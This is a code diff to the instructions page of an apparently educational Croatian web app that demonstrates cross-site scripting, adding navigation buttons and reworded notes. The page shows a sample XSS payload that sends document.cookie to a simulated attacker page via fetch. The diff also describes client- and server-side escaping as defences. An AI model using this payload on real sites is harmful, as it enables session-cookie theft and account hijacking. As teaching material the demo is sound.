@@ -63,6 +63,15 @@
                         <button type="submit">Odjavi se</button>
                     </form>
                 <% } %>
+                <br/><br/><br/><br/><br/>
+                <div class="navigator-buttons">
+                    <form action="/" method="get">
+                        <button type="submit">Početna stranica</button>
+                    </form>
+                    <form action="/sensitive-data-exposure" method="get">
+                        <button type="submit">Nesigurna pohrana osjetljivih podataka</button>
+                    </form>
+                </div>
             </div>
             <div class="instructions-container">
                 <h2>Upute za demonstraciju XSS ranjivosti</h2>
@@ -70,7 +79,7 @@
                 <div class="instruction-section">
                     <h3>1. Prijava u sustav</h3>
                     <p>• Prijavite se koristeći bilo koje korisničko ime</p>
-                    <p class="note">Nakon prijave, vaš session ID će biti pohranjen u kolačiću (cookie)</p>
+                    <p class="note">Nakon prijave, Vaš session ID će biti pohranjen u kolačiću (cookie)</p>
                 </div>
 
                 <div class="instruction-section">
@@ -79,7 +88,7 @@
                     <div class="code-block">
     <pre><code>&lt;script&gt;
         fetch('http://localhost:3000/mock-hacker-page?message=' + document.cookie);
-    &lt;/script&gt;</code></pre>
+&lt;/script&gt;</code></pre>
                     </div>
                 </div>
 
@@ -87,19 +96,21 @@
                     <h3>3. Testiranje ranjivosti</h3>
                     <p>• Kliknite "Podnesi" za izvršavanje koda</p>
                     <p>• Posjetite <a href="/mock-hacker-page" class="hacker-link">simuliranu napadačevu stranicu (kliknite ovdje)</a> da vidite ukradene podatke</p>
-                    <p class="note">U stvarnom scenariju, napadačeva stranica bi bila na drugoj domeni</p>
+                    <p class="note">U stvarnom scenariju, napadačeva stranica bi bila na drugoj domeni. Ako web aplikacija nije zaštičena HttpOnly/SameSite i CSP-om, slanje ovakvog payloada na drugu domenu je usitnu ostvarivo.</p>
                 </div>
 
+                <br/>
+
                 <div class="instruction-section">
-                    <h3>4. Zaštita od XSS napada</h3>
+                    <h3>Zaštita od XSS napada</h3>
                     <p>Aplikacija koristi dvije razine zaštite:</p>
                     <ul>
-                        <li>Klijentska zaštita: <code>encodeURIComponent()</code></li>
-                        <li>Poslužiteljska zaštita: Escape posebnih znakova (<, >, &, ", ' itd.)</li>
+                        <li>Zaštita na klijentu: <code>encodeURIComponent()</code> - primitvno, ali prva razina "zaštite"</li>
+                        <li>Zaštita na poslužitelju: Escape posebnih znakova (<, >, &, ", ' itd.) - neprobojno na XSS napad</li>
                     </ul>
                 </div>
 
-                <span>Kad je ranjivost onemogućena, pokušaj ubacivanja malicioznog koda u stranicu bit će spriječen te će se taj kod samo ispisati.</span>
+                <span>Kad je ranjivost onemogućena, pokušaj ubacivanja malicioznog koda u stranicu bit će spriječen te će se taj kod samo ispisati na stranici.</span>
 
                 
             </div>
@@ -176,7 +187,7 @@
             background-color: #daeaf6;
             padding: 20px;
             margin: 10px 0;
-            max-width: 670px;
+            max-width: 700px;
         }
         
         .instruction-section {
@@ -228,6 +239,11 @@
         .warning-box ul {
             margin: 10px 0;
             padding-left: 20px;
+        }
+        .navigator-buttons {
+            display: flex;
+            flex-direction: row;
+            gap: 10px;
         }
     </style>
 </body>
